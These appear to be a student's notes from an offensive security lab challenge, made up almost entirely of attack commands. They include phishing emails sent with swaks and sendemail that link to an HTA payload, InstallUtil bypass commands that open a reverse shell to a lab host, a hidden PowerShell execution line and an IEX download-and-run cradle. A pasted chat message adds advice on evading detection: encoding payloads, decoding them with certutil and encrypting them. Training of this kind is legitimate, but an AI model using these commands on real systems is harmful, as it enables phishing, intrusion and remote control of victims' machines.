
```
sudo swaks --body 'Please click here http://192.168.45.235/STAGE1.hta' --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" --header "Subject: Issues with mail" -t will@tricky.com -f bill@tricky.com --server 192.168.223.159
```

```
sendemail -f p3ta@tricky.com -t Will@tricky.com -u "Issues with mail system"  -m "http://192.168.45.235/STAGE1.hta" -s 192.168.223.159:25 
```

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=192.168.45.235 /rport=443 /U psby.exe

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U psby.exe

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /revshell:true /rhost:192.168.45.235 /rport:443 /U psby.exe

shell.Run("powershell -NoProfile -ExecutionPolicy Bypass -Command \"Start-Process 'c:\\Windows\\Tasks\\ConsoleApp1.exe'\"", 0, true);


Hello 👋 <@878511282553233428> and <@874530760097423381>   I share some tips for this:
||Since a simple HTA with a PowerShell downloader or the Shell.Run on download tools will get detected in the URL you should encode it.
You could do this by using WMI to get execution and reuse the tradecraft from Office macros where strings are encoded to ASCII (JS instead VBA). (6.8.3)
A HTA to download an encoded EXE, decode it with certutil and execute it through InstallUtil. (8.3.3)
The payload must be encrypted (Caeser encrypt at 6.5.2 should be good) ||
Personal advice: try not to get help any further so you get the most learning from the experience. Remember that the Challenges are designed to prepare you for the exam.

IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.205/shell.ps1